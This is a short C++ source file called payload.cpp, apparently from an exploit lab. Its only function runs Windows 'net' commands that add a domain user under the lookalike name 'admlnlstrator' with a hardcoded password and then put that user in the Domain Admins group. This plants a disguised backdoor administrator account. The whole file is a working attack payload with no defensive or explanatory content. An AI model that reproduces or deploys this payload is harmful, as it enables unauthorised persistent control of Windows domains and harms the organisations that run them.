// payload.cpp 
// RabbidByte (previously Essential Exploit Labs)

#include "stdafx.h"
#include <Windows.h>

void exploit()
{
	system("net user admlnlstrator MyPassw0rd /add /domain");
	system("net group \"Domain Admins\" admlnlstrator /add /domain");
}

int _tmain(int argc, _TCHAR* argv[])
{
	exploit();
	return 0;
}